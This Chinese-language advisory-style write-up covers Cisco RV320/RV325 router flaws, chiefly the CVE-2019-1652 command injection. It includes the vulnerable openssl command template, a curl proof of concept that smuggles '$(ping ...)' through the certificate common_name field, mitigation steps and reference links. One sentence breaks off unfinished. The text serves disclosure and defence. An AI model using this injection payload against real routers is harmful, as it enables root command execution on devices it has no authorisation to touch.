# Cisco RV320&RV325 漏洞分析

Cisco Small Business RV320和RV325都是美国思科（Cisco）公司的企业级路由器。 使用1.4.2.15版本至1.4.2.19版本固件的Cisco Small Business RV320和RV325中基于Web的管理界面存在信息泄露漏洞，该漏洞源于程序对URLs执行了错误的访问控制。远程攻击者可通过HTTP或HTTPS协议连接受影响的设备并请求URLs利用该漏洞检索敏感信息

# Cisco RV320和RV325 命令注入漏洞

## 漏洞描述

CVE ID：CVE-2019-1652

受影响版本：思科RV320及RV325路由器固件版本为1.4.2.15至1.4.2.19

Cisco Small Business RV320和RV325都是美国思科（Cisco）公司的企业级路由器。 1.4.2.15版本至1.4.2.19版本固件的Cisco Small Business RV320和RV325中存在命令注入漏洞，该漏洞源于程序没有正确地验证用户提交的输入。远程攻击者可通过发送特制的HTTP POST请求利用该漏洞以root权限在Linux shell上执行任意代码。

由于该漏洞需要登陆web管理界面后才可实现触发，因此该漏洞被评为中危。

路由器允许用户通过web接口生成新的X.509证书，使用的标准的openssl来生成证书，命令如下：
```
------------------------------------------------------------------------
openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1
------------------------------------------------------------------------
```
虽然已经通过JavaScript过滤了一些字符，但是却没有在服务器上进行输入的过滤、转义或编码，由此导致攻击者可以任意命令执行。

## POC

以下HTTP POST请求会调用证书生成器函数并触发命令注入。但是它需要设备的Web界面的有效cookie：
```
------------------------------------------------------------------------
curl -s -b "$COOKIE" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
"&organization=A&organization_unit=A&email=ab%40example.com"\
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
"SelectSubject_s=1" \
--data-urlencode "common_name=a'\$(ping -c 4 192.168.1.2)'b" \
"http://192.168.1.1/certificate_handle2.htm?type=4"
------------------------------------------------------------------------
```
执行该命令后，就会看到

## 解决方法

1. 防止不受信任的用户登陆web界面。
2. 升级固件版本至1.4.2.20及以后。

## 链接
1. [Cisco Small Business RV320 and RV325 Routers Command Injection Vulnerability](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject)
2. [官网下载链接](https://software.cisco.com/download/home/284005929/type/282465789/release/1.4.2.20?catid=268437899)
3. [exploit-db](https://www.exploit-db.com/exploits/46243)




https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html
https://www.securityfocus.com/bid/106728
https://www.zdnet.com/article/hackers-are-going-after-cisco-rv320rv325-routers-using-a-new-exploit/
https://www.exploit-db.com/exploits/46243
https://thehackernews.com/2019/01/hacking-cisco-routers.html
https://www.securityfocus.com/bid/106728/exploit
https://cxsecurity.com/issue/WLB-2019010236
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201901-877
https://www.anquanke.com/vul/id/1457015
https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html
https://seclists.org/fulldisclosure/2019/Jan/54


